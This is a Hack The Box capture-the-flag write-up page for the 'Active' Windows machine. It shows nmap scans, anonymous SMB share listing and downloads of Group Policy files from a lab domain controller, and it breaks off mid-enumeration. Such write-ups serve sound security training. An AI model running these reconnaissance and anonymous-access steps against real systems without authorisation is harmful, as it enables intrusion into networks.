@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Active (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Active from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/active/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Active (Easy)">
+<meta property="og:description" content="Writeup of Active from Hack The Box." />
+<meta property="og:url" content="/posts/active/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-21 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/active/">HTB Writeup - Active (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-21</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/windows/">windows</a>&nbsp;
+      
+      #<a href="/tags/actvedirectory/">ActveDirectory</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Active</code> machine is an easy windows box.</p>
+<p><img src="/images/Active.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV  -A  10.10.10.100    
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-07-19 23:04 EDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:04 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 28.40% <span style="color:#66d9ef">done</span>; ETC: 23:04 <span style="color:#f92672">(</span>0:00:08 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:00:31 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 55.56% <span style="color:#66d9ef">done</span>; ETC: 23:05 <span style="color:#f92672">(</span>0:00:10 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">982</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2023-07-20 03:04:43Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49165/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2:1:0: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-07-20T03:05:39
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-07-19T18:12:08
+</span></span><span style="display:flex;"><span>|_clock-skew: -1s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 92.27 seconds
+</span></span></code></pre></div><h2 id="smb-enumeration">SMB Enumeration<a href="#smb-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see the version of <code>SMB</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap  -p445 --script smb-protocols 10.10.10.100
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-07-19 23:08 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-protocols: 
+</span></span><span style="display:flex;"><span>|   dialects: 
+</span></span><span style="display:flex;"><span>|     2:0:2
+</span></span><span style="display:flex;"><span>|_    2:1:0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.37 seconds
+</span></span></code></pre></div><p>I list the <code>shares</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -N -L //10.10.10.100/445
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Replication     Disk      
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Users           Disk      
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.10.100 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>I connect to this <code>Replication</code> share and download a few files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.10.10.100/Replication
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\k</span>ali<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  active.htb                          D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311066</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd  active.htb
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DfsrPrivate                       DHS        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Policies                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  scripts                             D        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">18</span> 14:48:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311066</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\&gt;</span> cd Policies
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>      D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span>      D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311066</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\&gt;</span> cd <span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  GPT.INI                             A       <span style="color:#ae81ff">23</span>  Wed Jul <span style="color:#ae81ff">18</span> 16:46:06 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Group Policy                        D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  MACHINE                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  USER                                D        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">18</span> 14:49:12 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311066</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\&gt;</span> cd <span style="color:#e6db74">&#34;Group Policy&#34;</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  GPE.INI                             A      <span style="color:#ae81ff">119</span>  Wed Jul <span style="color:#ae81ff">18</span> 16:46:06 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311066</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\&gt;</span> get  GPE.INI 
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\G</span>PE.INI of size <span style="color:#ae81ff">119</span> as GPE.INI <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\&gt;</span> cd ..
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  GPT.INI                             A       <span style="color:#ae81ff">23</span>  Wed Jul <span style="color:#ae81ff">18</span> 16:46:06 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Group Policy                        D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  MACHINE                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  USER                                D        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">18</span> 14:49:12 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\&gt;</span> get GPT.INI
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as GPT.INI <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\&gt;</span> cd MACHINE 
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Microsoft                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Preferences                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Registry.pol                        A     <span style="color:#ae81ff">2788</span>  Wed Jul <span style="color:#ae81ff">18</span> 14:53:45 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\&gt;</span> cd Registry.pol 
+</span></span><span style="display:flex;"><span>cd <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\R</span>egistry.pol<span style="color:#ae81ff">\:</span> NT_STATUS_NOT_A_DIRECTORY
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Microsoft                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Preferences                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Registry.pol                        A     <span style="color:#ae81ff">2788</span>  Wed Jul <span style="color:#ae81ff">18</span> 14:53:45 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\&gt;</span> get Registry.pol
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\R</span>egistry.pol of size <span style="color:#ae81ff">2788</span> as Registry.pol <span style="color:#f92672">(</span>5.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\&gt;</span> cd Preferences
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\P</span>references<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Groups                              D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
